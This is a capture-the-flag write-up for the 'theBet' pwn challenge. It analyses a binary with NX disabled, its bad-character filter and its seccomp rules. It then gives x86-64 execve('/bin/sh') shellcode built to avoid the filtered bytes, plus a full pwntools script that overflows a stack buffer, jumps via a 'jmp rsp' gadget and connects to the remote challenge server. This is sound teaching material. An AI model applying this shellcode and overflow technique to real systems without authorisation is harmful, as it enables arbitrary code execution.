# theBet

Challenge Points: 200

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

This challenge was a shellcode based challenge, with a few bad characters in check. 

## Preliminary Analysis:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : FULL

```

## Analyzing the binary:
Here's the decompilation for main().
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+5h] [rbp-Bh] BYREF
  char s[10]; // [rsp+6h] [rbp-Ah] BYREF

  initialize(argc, argv, envp);
  puts(
    "Welcome to the Bet! You are standing among the world's best lawyers, politicians and criminals. \n"
    "\n"
    "You approach a young lawyer not more than 24 years of age. As you converse with him, you come to know about his repu"
    "tation. The next moment you know, you find yourself debating which is better - Capital Punishment or Life Imprisonme"
    "nt. \n"
    "\n"
    "You are of the opinion that Capital Punishment is better as a quick death would mean less pain as compared to life o"
    "f solitude in the cell. Your friend believes otherwise. \n"
    "\n"
    "You both decide on writing down your views and handing them over to a third party, (a criminal) so as to decide who'"
    "s opinion is correct. \n"
    "\n"
    "The criminal however states that the one who loses the debate shall either face Capital Punishment or Life Imprisonm"
    "ent depending on what the winning party chooses. \n"
    "\n"
    "Give us your name: ");
  fgets(s, 11, stdin);
  puts("\n1. Capital Punishment\n2. Life Imprisonment\nYour choice: ");
  __isoc99_scanf("%c", &v4);
  getchar();
  if ( v4 == 49 )
  {
    Capital_Punishment(&bad_chars);
  }
  else
  {
    if ( v4 != 50 )
    {
      puts("That is not a valid choice\n");
      exit(0);
    }
    Life_Imprisonment(&bad_chars);
  }
  setup_seccomp();
  return 0;
}

```
We see that we are presented with two choices, `Capital_Punishment` and `Life_Imprisonment`. Also `bad_chars` is passed as an argument to each of these functions. Before we look into each of these functions, let's check out `bad_chars`. 
By looking into the decompilation of binary in ida/ ghidra, one can find out what the `bad_chars` are:

```
.data:0000000000404010 bad_chars       db  0Dh                 ; DATA XREF: Capital_Punishment+61↑o
.data:0000000000404010                                         ; Life_Imprisonment+61↑o ...
.data:0000000000404011                 db  50h ; P
.data:0000000000404012                 db  2Eh ; .
.data:0000000000404013                 db 0BBh
.data:0000000000404014                 db 0B0h
.data:0000000000404015                 db  83h
.data:0000000000404016                 db 0F6h
.data:0000000000404017                 db  10h
.data:0000000000404018                 db 0AAh
.data:0000000000404019                 db 0D2h
.data:000000000040401A                 db  98h
.data:000000000040401B                 db  99h
.data:000000000040401C                 db  30h ; 0
.data:000000000040401D                 db  31h ; 1
.data:000000000040401E                 db    0
.data:000000000040401E _data           ends

```

Therefore, one can form the set of bad characters as 
`bad_chars = {'\x0d', '\x50', '\x2e', '\xbb', '\xb0', '\x83', '\xf6', '\x10', '\xaa', '\xd2', '\x98', '\x99', '\x30', '\x31'}`.

_Though according to the above decompilation, '\x00' is also a `bad _char`, however we will soon realize that it is insignificant as the check only happens for 14 characters._

Let us go ahead and check out each of the functions `Capital_Punishment` and `Life_Imprisonment`. 


### Capital_Punishment:

```
__int64 Capital_Punishment()
{
  __int64 result; // rax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Describe your argument: ");
  len = read(0, buf, 0x64uLL);
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)len;
    if ( i >= len )
      break;
    for ( j = 0; j <= 13; ++j )
    {
      if ( buf[i] == bad_chars[j] )
      {
        puts("\nI'm sorry you lost! You will be imprisoned for life.. :(\n");
        exit(0);
      }
    }
  }
  return result;
}
```
From the above decompilation for `Capital_Punishment`, we see that if any character in our input string consists of one of the above `bad_chars`, the program will simply exit. Since NX is disabled, one can assume our payload to contain a shellcode. 

### Life_Imprisonment:
```
__int64 Life_Imprisonment()
{
  __int64 result; // rax
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Describe your argument: ");
  len = read(0, buf, 0x64uLL);
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)len;
    if ( i >= len )
      break;
    for ( j = 0; j <= 13; ++j )
    {
      if ( buf[i] == bad_chars[j] )
      {
        puts("\nI'm sorry you lost! You will be executed.. :(\n");
        exit(0);
      }
    }
  }
  return result;
}
```
Similar to the decompilation of Capital_Punishment, our input is checked if it contains of the bad characters, and simply exits if it does. 


### seccomp:
We also see a seccomp filter for the above challenge. One can use seccomp-tools to dump what all syscalls are prohibetted to use. 

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0d 0xffffffff  if (A != 0xffffffff) goto 0018
 0005: 0x15 0x0b 0x00 0x00000003  if (A == close) goto 0017
 0006: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0017
 0007: 0x15 0x09 0x00 0x0000000a  if (A == mprotect) goto 0017
 0008: 0x15 0x08 0x00 0x0000000c  if (A == brk) goto 0017
 0009: 0x15 0x07 0x00 0x00000014  if (A == writev) goto 0017
 0010: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0017
 0011: 0x15 0x05 0x00 0x0000003c  if (A == exit) goto 0017
 0012: 0x15 0x04 0x00 0x0000003e  if (A == kill) goto 0017
 0013: 0x15 0x03 0x00 0x00000066  if (A == getuid) goto 0017
 0014: 0x15 0x02 0x00 0x00000068  if (A == getgid) goto 0017
 0015: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0017
 0016: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL

```
So cool! `execve` and `execveat` are allowed! Now our job would be to simply write the shellcode! 

## Writing the shellcode:

(Note: there could be many ways to write the same piece of shellcode and avoid the list of bad characters, however I will discuss my approach.)

Before we move onto shellcode scripting, let us make sure of the arguments to be placed into registers while making use of an execve syscall. 

For a 64 bit, execve syscall, 
 - `rax` : `0x3b` (syscall number)
 - `rdi` : `address containing "/bin/sh"`
 - `rsi` : `0x0`
 - `rdx` : `0x0`

```python=
shell = ''
shell += 'push rbx\n'
shell += 'push 0x0\n'			
shell += 'pop rsi\n'				# making sure rsi contains 0x0
shell += 'push rsi\n'
shell += 'pop rdx\n'				# making sure rdx contains 0x0
shell += 'push rbx\n'
shell += 'push 0x68732f\n'			# pushing '/sh\x00' onto the stack first
shell += 'push rsp\n'
shell += 'pop rbx\n'
shell += 'shl qword ptr [rbx], 0x20\n'	# left shifting by 32 bytes, with this we ensure "/sh\x00" is written as the upper 4 bytes and storing the result in rbx.
shell += 'push 0x6e69622f\n'			# pushing '/bin' onto the stack
shell += 'pop rax\n'
shell += 'add qword ptr [rbx], rax\n'		# adding the '/bin' as the lower 4 bytes to rbx whoch contains '/sh\x00' as the upper 4 bytes. 
shell += 'push rbx\n'
shell += 'pop rdi\n'				# placing "/bin/sh\x00" into rdi
shell += 'push 0x3b\n'				# updating rax to contain syscall number
shell += 'pop rax\n'
shell += 'syscall\n'				# syscall
```

## Exploit:

```python=

from pwn import *

def shellcode():

	# execve syscall
	shell = ''
	shell += 'push rbx\n'
	shell += 'push 0x0\n'
	shell += 'pop rsi\n'
	shell += 'push rsi\n'
	shell += 'pop rdx\n'
	shell += 'push rbx\n'
	shell += 'push 0x68732f\n'
	shell += 'push rsp\n'
	shell += 'pop rbx\n'
	shell += 'shl qword ptr [rbx], 0x20\n'
	shell += 'push 0x6e69622f\n'
	shell += 'pop rax\n'
	shell += 'add qword ptr [rbx], rax\n'
	shell += 'push rbx\n'
	shell += 'pop rdi\n'
	shell += 'push 0x3b\n'
	shell += 'pop rax\n'
	shell += 'syscall\n'
	
	shell = asm(shell)
	print(disasm(shell))

	return shell

if __name__=="__main__":
	context.arch='amd64'
	#p = process('./theBet')
	p = remote('gc1.eng.run', 31795)
	#gdb.attach(p)
	
	p.recv()
	p.sendline('aaaa')
	p.recv()
	p.sendline('1')
	
	p.recv()
	pay = '\x90'*(0x28)
	pay += p64(0x000000000040127e)# jmp rsp
	pay += shellcode()
	print(len(pay))
	
	p.sendline(pay)
	
	p.interactive()
```


